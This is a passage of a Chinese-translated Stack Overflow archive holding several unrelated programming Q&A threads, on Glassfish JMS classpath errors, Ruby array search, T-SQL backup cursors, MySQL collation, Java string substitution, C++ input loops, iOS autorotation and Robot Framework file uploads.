我想知道：更好的方式来查询信息并设置为我的 ContactInfo 模型或同时获取姓名、电话号码、电子邮件、照片以传递给光标适配器的查询。

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-29T10:27:38.273

我从 Contacts 应用程序更改为`CusorAdapter`并使用[ContactsPhotoLoader](http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android-apps/2.2_r1.1/com/android/contacts/ContactPhotoLoader.java)并提高了性能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T08:48:28.347

要获取联系信息，您必须使用 Android Contact API。此外，您必须记住，对于 API 4 (1.6) 以下的 android api 和 Android API 5 (2.0) 及更高版本，您必须以不同的方式处理此 Api：

我将为您提供一些对您有帮助的好链接：

1.  [使用 Android 联系人](http://www.higherpass.com/Android/Tutorials/Working-With-Android-Contacts/1/)
2.  [处理联系人照片（所有 API 级别）](http://thinkandroid.wordpress.com/2009/12/30/handling-contact-photos-all-api-levels/)
3.  [使用 Contact Picker API 2.0 及更高版本](http://mobile.tutsplus.com/tutorials/android/android-essentials-using-the-contact-picker/)
4.  [检索联系信息（姓名、号码和头像）API4 及更低版本](http://thinkandroid.wordpress.com/2010/01/19/retrieving-contact-information-name-number-and-profile-picture/)

    这些还有一些类似于你的 SO 线程，必须对你有帮助

[从 android 联系人选择器获取联系人信息](https://stackoverflow.com/questions/3044545/get-contact-info-from-android-contact-picker)

[从联系人获取照片](https://stackoverflow.com/questions/3509178/getting-a-photo-from-a-contact)

# java - 不允许创建线程时如何将 Glassfish 客户端连接到 Glassfish JMS 服务器？

> ID：10811802
> 
> 赞同：1
> 
> 时间：2012-05-30T07:28:11.973
> 
> 标签：java, glassfish, client, jms, threadpool

我有一个应用程序，其中客户端组件在“托管”环境中运行（作为 Adob​​e InDesign 插件）。在这种“托管”环境中，似乎不可能在执行期间创建线程，而只能在应用程序启动时创建。

这个客户端组件通过 JNDI 和 RMI/IIOP 连接到 Glassfish 服务器，以执行各种 EJB 方法调用，所有这些都可以完美运行（除了一些在这里不重要的繁琐的[CORBA 序列化问题）。](https://stackoverflow.com/q/10614686/15619)我想让它也使用 JMS 连接，以执行一些主题阅读。我用来执行这些主题阅读的代码已经在单元测试中，确保它可以启动、阅读主题并执行所需的集成（这更像是一个集成测试而不是单元测试，但我必须确定我的应用程序通信层，不是吗？）。这段代码在单元测试中运行时可以完美运行。不幸的是，当从我的客户端组件（嵌入在 Indesign 中，并且无法创建线程）运行时，它以`NullPointerException`以下方式失败：

```
29 mai 2012 18:07:22 com.sun.enterprise.connectors.ActiveRAFactory getActiveRA
INFO: Deployed RAR [ jmsra ] has inbound artifacts, but the runtime does not support it. Providing only outbound support 
29 mai 2012 18:07:22 org.hibernate.validator.util.Version <clinit>
INFO: Hibernate Validator 4.2.0.Final
29 mai 2012 18:07:24 com.sun.messaging.jms.ra.ResourceAdapter start
INFO: MQJMSRA_RA1101: GlassFish MQ JMS Resource Adapter: Version:  4.5  (Build 29-b) Compile:  Wed Feb  9 22:53:30 PST 2011
29 mai 2012 18:07:24 com.sun.messaging.jms.ra.ResourceAdapter start
INFO: MQJMSRA_RA1101: GlassFish MQ JMS Resource Adapter starting: broker is EMBEDDED, connection mode is Direct
29 mai 2012 18:12:58 com.sun.messaging.jms.blc.LifecycleManagedBroker start
GRAVE: MQJMSRA_RA4001: start:Aborting:Exception starting EMBEDDED broker=java.lang.NullPointerException
29 mai 2012 18:12:58 com.sun.messaging.jms.blc.LifecycleManagedBroker start
INFO: SJSMQ LifecycleManagedBroker configuration=
    brokerInstanceName       =imqbroker
    brokerBindAddress        =null
    brokerPort               =7676
    brokerHomeDir            =C:\Java-ext\glassfish3\mq
    brokerLibDir             =C:\Java-ext\glassfish3\mq\lib
    brokerVarDir             =C:\Java-ext\glassfish3\glassfish\domains\autocat\imq
    brokerJavaDir            =C:\Program Files\Java\jdk1.6.0_30\jre
    brokerArgs               =null
    MasterBroker             =null
    brokerId                 =null
    adminUsername            =admin
    adminPassword            =<default>
    adminPassFile            =null
    ConnectionURL            =mq://localhost:7676/
    dbType                   =null
    dbProps                  ={}
    dsProps                  ={}
    useJNDIRmiServiceURL     =true
    useSSLJMXConnector       =true
    brokerEnableHA           =false
    clusterId                =null
    rmiRegistryPort          =7776
    startRmiRegistry         =true
    brokerStartTimeout       =  jmxServiceURL            =null
60000

29 mai 2012 18:12:58 com.sun.enterprise.connectors.ActiveOutboundResourceAdapter init
GRAVE: RAR6035 : Resource adapter start failed. 
javax.resource.spi.ResourceAdapterInternalException: MQJMSRA_RA4001: start:Aborting:Exception starting EMBEDDED broker=java.lang.NullPointerException
    at com.sun.messaging.jms.blc.LifecycleManagedBroker.start(LifecycleManagedBroker.java:458)
    at com.sun.messaging.jms.ra.ResourceAdapter.start(ResourceAdapter.java:380)
    at com.sun.enterprise.connectors.ActiveOutboundResourceAdapter.startResourceAdapter(ActiveOutboundResourceAdapter.java:182)
    at com.sun.enterprise.connectors.ActiveOutboundResourceAdapter.init(ActiveOutboundResourceAdapter.java:129)
    at com.sun.enterprise.connectors.ActiveRAFactory.instantiateActiveResourceAdapter(ActiveRAFactory.java:135)
    at com.sun.enterprise.connectors.ActiveRAFactory.createActiveResourceAdapter(ActiveRAFactory.java:106)
    at com.sun.enterprise.connectors.service.ResourceAdapterAdminServiceImpl.createActiveResourceAdapter(ResourceAdapterAdminServiceImpl.java:212)
    at com.sun.enterprise.connectors.ConnectorRuntime.createActiveResourceAdapter(ConnectorRuntime.java:379)
    at com.sun.enterprise.resource.naming.AdministeredObjectFactory.getObjectInstance(AdministeredObjectFactory.java:107)
    at javax.naming.spi.NamingManager.getObjectInstance(Unknown Source)
    at com.sun.enterprise.naming.impl.SerialContext.getObjectInstance(SerialContext.java:556)
    at com.sun.enterprise.naming.impl.SerialContext.lookup(SerialContext.java:514)
    at com.sun.enterprise.naming.impl.SerialContext.lookup(SerialContext.java:455)
    at javax.naming.InitialContext.lookup(Unknown Source)
    at fr.perigee.autocat.indesign.remoting.jndi.jms.AdapterJMSListener.getConsumer(AdapterJMSListener.java:261)
    at fr.perigee.autocat.indesign.remoting.jndi.jms.AdapterJMSListener$AdapterJMSListenerRunnable.run(AdapterJMSListener.java:50)
    at java.util.concurrent.Executors$RunnableAdapter.call(Unknown Source)
    at java.util.concurrent.FutureTask$Sync.innerRunAndReset(Unknown Source)
    at java.util.concurrent.FutureTask.runAndReset(Unknown Source)
    at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$101(Unknown Source)
    at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.runPeriodic(Unknown Source)
    at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(Unknown Source)
    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(Unknown Source)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
    at java.lang.Thread.run(Unknown Source)
Caused by: java.lang.RuntimeException: java.lang.NullPointerException
    at com.sun.messaging.jmq.jmsclient.runtime.impl.BrokerInstanceImpl.start(BrokerInstanceImpl.java:211)
    at com.sun.messaging.jms.blc.EmbeddedBrokerRunner.start(EmbeddedBrokerRunner.java:331)
    at com.sun.messaging.jms.blc.LifecycleManagedBroker.start(LifecycleManagedBroker.java:454)
    ... 24 more
Caused by: java.lang.NullPointerException
    at com.sun.messaging.jmq.jmsserver.data.TransactionList.<init>(TransactionList.java:182)
    at com.sun.messaging.jmq.jmsserver.Broker._start(Broker.java:1170)
    at com.sun.messaging.jmq.jmsserver.Broker.start(Broker.java:456)
    at com.sun.messaging.jmq.jmsserver.BrokerProcess.start(BrokerProcess.java:164)
    at com.sun.messaging.jmq.jmsserver.DirectBrokerProcess.start(DirectBrokerProcess.java:92)
    at com.sun.messaging.jmq.jmsclient.runtime.impl.BrokerInstanceImpl.start(BrokerInstanceImpl.java:206)
    ... 26 more 
```

从我目前发现的情况来看，客户端代码获得了到 JMS 服务器的连接（连接到`mq://localhost://7676`），但随后无法启动 TransactionList。未编译的源代码（感谢 Jad ！）表明它在那里失败：

```
 /* 182*/Globals.getClusterManager().addEventListener(((ClusterListener) (this))); 
```

尝试调试时，我还发现我的客户端无法启动，`org.glassfish.enterprise.iiop.util.S1ASThreadPoolManager`因为同样不可能创建线程。

我想某处有问题，但是什么？我不知道。

那么，我如何告诉 glassfish 客户端环境线程只能从我的个人线程池（在应用程序启动时创建）中获取，而不是尝试创建自己的线程池并惨遭失败？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-01T07:31:35.753

# 精简版

我使用 maven 部署了我的应用程序，忘记了 Glassfish 的[jms-core.jar](http://mvnrepository.com/artifact/org.glassfish.jms/jms-core/3.1.1)，因为它是[gf-client-module.jar的](http://mvnrepository.com/artifact/org.glassfish.appclient/gf-client-module/3.1.1)**运行时**依赖项，而我的 maven 构建只复制了**编译**依赖项。修复 Maven 构建修复了该问题。

 **# 长版

长版更多的是一个关于恐惧、眼泪和鲜血的故事。

## 那个 clusterManager 是怎么变成 null 的？

由于我最初遇到与 TransactionList 关联的 ClusterManager 的问题，因此我尝试查看`com.sun.messaging.jmq.jmsserver.Globals`代码是如何初始化它的。我发现它是在一个恰当地调用的方法`Globals#initCLusterManager(MQAddress)`中，它使用各种类参数（包括一个属性对象）加载了一个集群管理器，该集群管理器将被我的应用程序使用。什么 ？集群管理器？在客户端代码中？那是什么鬼（稍后会详细介绍）？

无论如何，该 ClusterManager 已加载，但之后设置为 null （主要是由于在集群配置中使用了环回地址 - 再一次，在 JMS*客户端*中非常奇怪）......所以看看它是如何初始化的显然不是正确的路径解决错误，这让我感到困惑。

## 测试通过但生产代码仍然存在错误时该怎么办？

正如我在问题中所说，我有一个测试，它（据我了解）完全相同。测试总是成功，生产总是失败。所以那里一定有不同的东西，不是吗？

所以我对我做了一些新的事情：我在该`Globals#initClusterManager`代码中放置了一个断点，并尝试使用两种代码来达到它：生产和测试。有人可能会猜到，在 prod 中达到了断点，但在 test 中没有！所以我将断点移到了某个我已经知道会到达的地方：[`ActiveRAFactory#getActiveRA(ConnectorDescriptor, String)`](http://grepcode.com/file/repo1.maven.org/maven2/org.glassfish.connectors/connectors-runtime/3.1.1/com/sun/enterprise/connectors/ActiveRAFactory.java#ActiveRAFactory.getActiveRA%28com.sun.enterprise.connectors.ConnectorDescriptor,java.lang.String%29)...（哦等等，不，我没有把它放在那里，但是我放断点的地方告诉我执行路径变成了不同的是那个方法调用，所以我最后把断点放在那里）。

有了这个断点，我立刻注意到了一些奇怪的事情：调用

```
 Collection<ActiveResourceAdapter> activeRAs =  activeRAHabitat.getAllByContract(ActiveResourceAdapter.class); 
```

根据我在 test 或 prod 中的事实返回不同的结果：我在 test 的列表中得到了 4 个元素（包括[`ActiveJmsResourceAdapter`](http://grepcode.com/file/repo1.maven.org/maven2/org.glassfish.jms/jms-core/3.1.1/com/sun/enterprise/connectors/jms/system/ActiveJmsResourceAdapter.java#ActiveJmsResourceAdapter)），但在生产中只有 3 个。

## 不同的 ResourceAdapter，但为什么？

然后我很困惑：然后我倾向于责怪[Glassfish HK2 ，除了](http://hk2.java.net/)[作为一个我还不知道的 IoC 容器](https://twitter.com/riduidel/status/208217398455697408)之外没有其他原因......结果我错了，哦**，**大错特错了！

启示来自 Eclipse 调试器中的表达式 eval：我输入为表达式

```
com.sun.enterprise.connectors.jms.system.ActiveJmsResourceAdapter.class 
```

我得到的只是一个 ClassNotFoundException ......等等......一个 ClassNotFoundException ？这堂课在`jms-core.jar`？我很确定 jar 在我的生产文件夹中，不是吗？... 不 ？**没有**？

他妈的 ！

原来我用来复制该文件夹中的 jar的[maven-dependency-plugin使用了复制](http://maven.apache.org/plugins/maven-dependency-plugin/)[依赖项](http://maven.apache.org/plugins/maven-dependency-plugin/copy-dependencies-mojo.html)，其[includeScope](http://maven.apache.org/plugins/maven-dependency-plugin/copy-dependencies-mojo.html#includeScope)配置为“编译”。

# 简单解决方案的疯狂错误

所以我向复制依赖项添加了另一个执行，配置为 incldueScope“运行时”，一切正常。**

# ruby-on-rails - Google-api-client 请求访问令牌

> ID：10811804
> 
> 赞同：1
> 
> 时间：2012-05-30T07:28:20.443
> 
> 标签：ruby-on-rails, ruby, google-api

我的要求是在 google.com 中获取搜索查询的前 20 个链接。我正在使用[Google-api-client](http://code.google.com/p/google-api-ruby-client//)！红宝石。

这是我正在使用的代码，

```
require 'google/api_client'
client = Google::APIClient.new
response = client.execute(
    search.cse.list, 'key' => '<My Key>', 'cx' => '013036536707430787589%3A_pqjad5hr1a', 'alt' => 'json', 'q' => 'hello world'
) 
```

现在我面临三个问题，

1.  我想使用默认的 Google 搜索，那么“cx”值应该是多少？我使用的一个来自[https://developers.google.com/custom-search/v1/using_rest#cx](https://developers.google.com/custom-search/v1/using_rest#cx)
2.  我没有得到任何结果，而是收到以下警告“ArgumentError：缺少访问令牌”。我通过定义 "client.authorization.access_token = '123'" 使用虚拟令牌解决了这个问题。但我不确定这是否是一个正确的解决方案。
3.  在我定义 access_token 之后，我仍然没有得到任何结果。而是收到警告“无效的凭据”。但是如果我使用相同的 URL（由 api 生成），在浏览器中我会得到结果。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-30T23:47:13.793

无需设置虚拟访问令牌，只需将授权机制设置为 nil：

```
client.authorization = nil 
```

这样它就不会发送授权标头，而只会依赖 API 密钥来识别您的应用程序。

# ruby - ruby 搜索关键字的数组

> ID：10811807
> 
> 赞同：5
> 
> 时间：2012-05-30T07:28:25.967
> 
> 标签：ruby, arrays, search

我正在用 ruby​​ 脚本解析一个大型 CSV 文件，需要从一些搜索键中找到最接近的标题匹配项。搜索键可能是一个或多个值，并且这些值可能不完全匹配，如下所示（应该接近）

```
search_keys = ["big", "bear"] 
```

一个包含我需要搜索的数据的大数组，只想在`title`列上搜索：

```
array = [
          ["id", "title",            "code", "description"],
          ["1",  "once upon a time", "3241", "a classic story"],
          ["2",  "a big bad wolf",   "4235", "a little scary"],
          ["3",  "three big bears",  "2626", "a heart warmer"]
        ] 
```

在这种情况下，我希望它返回该行`["3", "three big bears", "2626", "a heart warmer"]`，因为这是与我的搜索键最接近的匹配。

我希望它从给定的搜索键中返回最接近的匹配项。

我可以使用任何助手/库/宝石吗？以前有人做过吗？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T08:30:02.570

我很担心，这项任务应该由数据库级别或类似级别的任何搜索引擎处理，没有必要在应用程序中获取数据并跨列/行进行搜索等，应该很昂贵。但现在这里是简单的方法:)

```
array = [
          ["id", "title",            "code", "description"],
          ["1",  "once upon a time", "3241", "a classic story"],
          ["2",  "a big bad wolf",   "4235", "a little scary"],
          ["3",  "three big bears",  "2626", "a heart warmer"]
        ]

h = {}

search_keys = ["big", "bear"]

array[1..-1].each do |rec|
  rec_id = rec[0].to_i

  search_keys.each do |key|
    if rec[1].include? key
      h[rec_id] = h[rec_id] ? (h[rec_id]+1) : 1
    end
  end
end

closest = h.keys.first

h.each do |rec, count| 
  closest = rec if h[closest] < h[rec]
end

array[closest] # => desired output :) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T08:19:37.407

我认为您可以自己完成，无需使用任何宝石！这可能接近您的需要；在数组中搜索键并为每个找到的元素设置一个排名。

```
result = []
array.each do |ar|
    rank = 0
    search_keys.each do |key|
        if ar[1].include?(key)
            rank += 1
        end
    end

    if rank > 0
        result << [rank, ar]
    end 
end 
```

这段代码可以比上面写得更好，但我想向你展示细节。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-30T09:29:10.377

这行得通。将查找并返回匹配*行的数组作为`result`.

*matched rows = id、title、code 或 description 匹配任何提供的 seach_keys 的行。包括部分搜索，例如“熊”中的“熊”

```
result = []
array.each do |a|
    a.each do |i|
        search_keys.each do |k|
            result << a if i.include?(k)
        end
    end
end
result.uniq! 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-30T09:43:44.217

你可以用更简洁的方式来写它......

```
array = [
          ["id", "title",            "code", "description"],
          ["1",  "once upon a time", "3241", "a classic story"],
          ["2",  "a big bad wolf",   "4235", "a little scary"],
          ["3",  "three big bears",  "2626", "a heart warmer"]
        ]
search_keys = ["big", "bear"]

def sift(records, target_field, search_keys)
    # find target_field index
    target_field_index = nil
    records.first.each_with_index do |e, i|
        if e == target_field
            target_field_index = i
            break
        end
    end
    if target_field_index.nil?
        raise "Target field was not found"
    end

    # sums up which records have a match and how many keys they match
    # key => val = record => number of keys matched
    counter = Hash.new(0) # each new hash key is init'd with value of 0

    records.each do |record| # look at all our given records
        search_keys.each do |key| # check each search key on the field
            if record[target_field_index].include?(key)
                counter[record] += 1 # found a key, init to 0 if required and increment count
            end
        end
    end

    # find the result with the most search key matches
    top_result = counter.to_a.reduce do |top, record|
        if record[1] > top[1] # [0] = record, [1] = key hit count
            top = record # set to new top
        end
        top # continue with reduce
    end.first # only care about the record (not the key hit count)
end

puts "Top result: #{sift array, 'title', search_keys}"
# => Top result: ["3", "three big bears", "2626", "a heart warmer"] 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-30T17:20:06.257

这是我的单线镜头

```
p array.find_all {|a|a.join.scan(/#{search_keys.join("|")}/).length==search_keys.length}
=>[["3", "three big bears", "2626", "a heart warmer"]] 
```

按匹配数的顺序获取所有行

```
p array.drop(1).sort_by {|a|a.join.scan(/#{search_keys.join("|")}/).length}.reverse 
```

任何人都知道如何组合最后一个解决方案，以便删除不包含任何键的行并保持简洁？

# sql-server-2008 - SQL Transact-SQL 不适用于数据库名称配置 1

> ID：10811811
> 
> 赞同：0
> 
> 时间：2012-05-30T07:28:30.437
> 
> 标签：sql-server-2008, tsql

我在 SQL Server 2008 中创建了一个 SQL 代理作业，它执行以下代码：

```
BEGIN
SET NOCOUNT ON;
declare @database nchar(20);

DECLARE Database_Cursor CURSOR FOR
SELECT [name]
FROM master.dbo.sysdatabases
ORDER BY [name]

OPEN Database_Cursor;
FETCH NEXT FROM Database_Cursor INTO @database;
WHILE @@FETCH_STATUS = 0
BEGIN
    EXEC    [dbo].[sp_BackupDatabase]
        @databaseName = @database

      FETCH NEXT FROM Database_Cursor INTO @database;
END;
CLOSE Database_Cursor;
DEALLOCATE Database_Cursor;
END
GO 
```

基本上，我检索数据库列表并为每个数据库执行备份脚本。此脚本适用于大多数数据库，但某些数据库返回错误：

> 消息 911，级别 16，状态 11，第 1 行
> 数据库“appName_Configuration”不存在。确保输入的名称正确。

这是正确的，这个数据库不存在。我们有几个这样命名的数据库：

*   appName_Configuration1
*   appName_Configuration2
*   ...

由于某种原因，该脚本不会将包含数字的名称传递给备份脚本。如果我用静态名称 (appName_Configuration1) 替换 @database 变量，它就可以正常工作。

还值得一提的是：还有一些其他数据库最后有一个数字，它们工作正常：

*   appName_Microsoft1
*   appName_Microsoft2

我怀疑“配置”这个词可能与它有关，但现在重命名数据库不是一个选项。谁能帮我找到解决方案，以便将名称正确传递给存储过程？

亲切的问候，马修

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-30T07:49:42.277

根据您的数据库名称增加@database 变量的大小，最大长度可以是......例如

```
declare @database nchar(100); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:34:07.507

您将 @database 声明为 nchar(20)。你的名字比较长。例如，使用[nvarchar](https://stackoverflow.com/questions/176514/what-is-the-difference-between-char-nchar-varchar-and-nvarchar-in-mssql) (50)。

# c# - 我的 SQL + C# 奇怪的问题

> ID：10811812
> 
> 赞同：1
> 
> 时间：2012-05-30T07:28:35.637
> 
> 标签：c#, asp.net, mysql, c#-2.0, asp.net-2.0

每次刷新时，我都会在页面上收到非常奇怪的错误，但不是每次。

我有一个简单的页面打印出数据如下：

后端（aspx.cs）

```
string sql="Select * from content_mgr_multiple where category = '1' limit 0, 1";    
DataView dv = DBAccess.GetListView(sql);
this.ResultList.DataSource = dv;
this.ResultList.DataBind(); 
```

前端（aspx）

```
<asp:Repeater ID="ResultList" runat="server">
<ItemTemplate>
     <%#  Eval("content") %>
</ItemTemplate>
</asp:Repeater> 
```

代码与上面一样简单，但每次刷新都会显示以下错误。 **DataBinding：“System.Data.DataRowView”不包含名为“content”的属性。**

假设我刷新页面 6 次。第 2、4、6 次正常，但第 1、3、5 次出现上述错误。

我尝试按以下方式进行故障排除。我输入代码以打印出该 DataSource 中的列名。

```
string sql="Select * from content_mgr_multiple where category = '1' limit 0, 1";    
DataView dv = DBAccess.GetListView(sql);
        foreach (DataColumn dr in dv.Table.Columns)
        {
            Response.Write(dr.ColumnName + "<BR>");
        }
this.ResultList.DataSource = dv;
this.ResultList.DataBind(); 
```

第 2 次、第 4 次和第 6 次刷新时，列名以英文打印。

```
id
category
title
titleCh
content
contentCh 
```

第1、3、5次刷新时，列名以中文打印。

```
楤
捡瑥杯特
瑩瑬�
瑩瑬敃�
捯湴敮�
捯湴敮瑃� 
```

我已经为此奋斗了一段时间，请帮忙。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T23:49:29.343

非常感谢各位的关心。最后，我找到了导致它的原因。正如 Eggyal 指出的那样，它让我意识到数据库出了点问题。

我也有包含中文标题的 content_mgr 类别表。在该类别表中，中文字段被创建为“ucs2_general_ci”。一旦我将其更改为“utf8_general_ci”，问题就解决了。

# html - CSS样式定义

> ID：10811814
> 
> 赞同：0
> 
> 时间：2012-05-30T07:28:45.130
> 
> 标签：html, css, css-selectors

我正在使用样式定义，例如

```
.detail-navi-contents div.tab-active, .detail-navi-contents div.tab-inactive { } 
```

有没有更好的方法来编写这个定义？或者没关系

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:31:43.830

那这个呢？如果您同时获得`inactive` **and** `active`，那么为什么要选择它们？

尝试：

```
.detail-navi-contents div { } 
```

# export - 直径出口不理想

> ID：10811821
> 
> 赞同：1
> 
> 时间：2012-05-30T07:28:56.870
> 
> 标签：export, dia

我正在使用 Dia 对 UML 图进行建模，但导出为 png 或 eps 并不让我高兴。对于某些缩放级别，许多线条不再笔直！

这是查看器的问题（在本例中为 gwenview）吗？我设置线条时是否有问题，或者 Dia 中是否有防止此问题的功能？

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-31T18:52:24.057

实际上，您正在寻找的是使对象彼此对齐的功能。对齐网格仅在某些情况下适用于您的目的，例如当连接的对象具有相同的高度/宽度时，或者当线条连接到捕捉的边缘时。

最好垂直或水平对齐对象。如果线连接在对象的中间，则居中对齐。如果线连接在对象的右边缘，并且它们垂直堆叠，请使用右对齐垂直对齐:)

如果我没记错的话，对齐选项可以在对象菜单中找到。它绝对在最左边的菜单之一中，在底部！一旦我再次在我的电脑前，我会立即更新。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-02-03T14:22:27.397

无论对象的高度和宽度如何，如果它们通过箭头（ snap in ）连接，则可以选择需要对齐的对象（例如框）并按 Alt-shift-M。这将拉直所有线条。

前

[![以前的](../Images/b3a03e7640d012d905c8b90cbfa84f6d.png)](https://i.stack.imgur.com/1yEHc.png)

居中后 ( Alt-Shift-M )

[![在此处输入图像描述](../Images/236098a184a98df6820a27f9da029741.png)](https://i.stack.imgur.com/3fa7U.png)

# java - 替换字符串中特定索引处的字符串？

> ID：10811824
> 
> 赞同：-2
> 
> 时间：2012-05-30T07:29:12.630
> 
> 标签：java

我们如何在 Java 中替换现有字符串中的特定字符串？

例子：

```
String param = "aa,bb,cc";
String str = 
  "select column_val from table_name where a = '?' and b = '?' and c = '?'"; 
```

现在我想用它的位置替换参数，比如..

```
String newStr = 
  "select column_val from table_name where a = 'aa' and b = 'bb' and c = 'cc'"; 
```

我们应该怎么做？stringutil 中是否有任何现有方法，或者是否有任何方法可以做到这一点？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-30T07:31:56.700

处理此问题的正确方法是[使用](http://docs.oracle.com/javase/tutorial/jdbc/basics/prepared.html) [`PreparedStatement`](http://docs.oracle.com/javase/6/docs/api/java/sql/PreparedStatement.html). 它不仅会替你做替换，还会保护你免受[SQL 注入攻击](http://xkcd.com/327/)。

> 是的，我只是在这里演示选择查询，但它不是选择查询，它是简单的字符串

在这种情况下，有一种简单的方法可以做到：

```
 String param = "aa,bb,cc";
 String str = "select column_val from table_name where a = '?' and b = '?' and c = '?'";
 String fmt = str.replaceAll("[?]", "%s");
 String newStr = String.format(fmt, (Object[])param.split(",")); 
```

确保您输入的模式没有任何杂散的问号或百分比字符。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:30:31.897

`String.format`听起来像你应该使用的；它基本上就像 C 的`sprintf`。详细信息可以在[`Formatter`](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/Formatter.html)javadoc 中找到。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T07:44:25.580

```
 String param = "aa,bb,cc";
    String str = 
      "select column_val from table_name where a = # and b = # and c = #";
    String [] arr = param.split(",");
    for(int i=0; i<arr.length; i++){str.indexOf("#");
        str = str.replaceFirst("#", "'"+arr[i]+"'");
    }
    System.out.println(str); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-30T07:57:15.757

我建议你使用 StringBuilder。它们为您的字符串操作类型提供了一些性能提升，尤其是当您的 sql 或参数是长字符串时。

这是一个例子：

```
String param = "aa,bb,cc";
String str = 
     "select column_val from table_name where a = '?' and b = '?' and c = '?'";

@Test
public void Substitute(){
    StringBuilder builder=new StringBuilder(str);

    String[] params = param.split(",");
    int position=0;
    for (String paramValue:params){
        position=builder.indexOf("?",position);
        if (position==-1)
            throw new RuntimeException("too parameter values specified.");
        builder.replace(position,position+1,paramValue);
        position++;
    }
    position=str.indexOf("?",position);
    if (position!=-1)
        throw new RuntimeException("Not all parameter specified.");

    Assert.assertEquals(builder.toString(),
          "select column_val from table_name where a = 'aa' and b = 'bb' and c = 'cc'");

} 
```

正如其他人所说，请记住清理参数值以避免安全问题......

# ios5 - 自动旋转不起作用

> ID：10811825
> 
> 赞同：0
> 
> 时间：2012-05-30T07:29:18.247
> 
> 标签：ios5, storyboard, autorotate

我在每个视图控制器中有一个代码：

```
- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
        return (interfaceOrientation != UIInterfaceOrientationPortraitUpsideDown);
} 
```

我还更改了 plist 中支持的设备方向。

还能是什么？

PS 正如我检查的那样——不再发送关于轮换的通知。可能与某些框架存在冲突...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:47:18.357

看看[为什么我的 UIViewController 不会随设备旋转？](http://developer.apple.com/library/ios/#qa/qa1688/_index.html)

还有一句话，不要从 plist 修改设备方向，还有另一种方法，选择 project ，然后选择 Summary 选项卡，然后在 Supported Device Orientations 中选择您需要的。这种方式将自动编辑您的 plist。

# c++ - 遇到 EOF 时的 std::cin 语法

> ID：10811832
> 
> 赞同：0
> 
> 时间：2012-05-30T07:29:40.457
> 
> 标签：c++, cin

这段代码只是为了实现一个功能，当您输入两次相同的字符串时，该功能将停止。

```
string predata;
string c_data;  //current data

cout << "please input string data" << endl;

//loop
while (cin >> c_data) {

    if (c_data == predata) {
        cout << "the " << c_data << " is the same one" << endl;
        break;
    }   
    else {
        predata = c_data;
    }   

    cout << "please input next word" << endl;
}   

if (c_data != predata)
    cout << "there's no repeated word" << endl; 
```

**问题**：当我用CTRL-D停止cin时，c_data没有变化，永远不会输出*“没有重复词”*，那我该如何判断呢？

**PS**：这是《c++入门》中的一个练习，答题书上的代码也没有解决问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T09:13:43.360

您对之前输入的内容并不太具体。当`>>` a`std::string`失败时，它会使右手操作数处于未指定状态。（如果这实际上是书中的代码，我会把这本书扔掉。）

这里最简单的解决方案就是使用一个标志：

```
std::string previous;
std::string current;
bool duplicateSeen = false;
std::cout << "Please input initial string" << std::endl;
std::cin >> previous;
if ( std::cin ) {
    //  Code needs at least one input to compare...
    while ( ! duplicateSeen && std::cin >> current ) {
        duplicateSeen = current == previous;
        previous = current;
        std::cout << "Please input the next word" << std::endl;
    }
}
if ( duplicateSeen ) {
    std::cout << '\"' << previous << "\" is duplicated" << std::endl;
} else {
    std::cout << "No repeated words" << std::endl;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:36:44.877

我认为当你击球时`CTRL-D`，你会中断跑步。

试试这个：

```
while (cin >> c_data) {

if (c_data == "<EXIT>") break;

....
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T07:55:37.840

这可能是一个解决方案：

```
c_data = "eof is setted";

while (cin >> c_data) {

    if (c_data == predata) {
        cout << "the " << c_data << " is the same one" << endl;
        break;
    }   
    else {
        predata = c_data;
        c_data = "eof is setted";
    }   

    cout << "please input next word" << endl;
}   

if (c_data != predata)
    cout << "there's no repeated word" << endl; 
```

# robotframework - 通过单击浏览按钮上传文本文件

> ID：10811839
> 
> 赞同：0
> 
> 时间：2012-05-30T07:30:28.213
> 
> 标签：robotframework

我正在使用带有 SeleniumLibrary（测试库）的 Robot Framework 编写用于 Web 测试的机器人测试，我的一个测试涉及通过单击网页上的“浏览”按钮并使用弹出的 windows 文件资源管理器窗口从桌面上传文件向上导航到并选择文件。我已经下载了 Autolt 库，但无法弄清楚要使用哪个关键字。任何示例测试用例都更有帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-04T19:17:08.263

[`Choose File`](https://robotframework.org/SeleniumLibrary/SeleniumLibrary.html#Choose%20File)应该以您想要的方式工作。

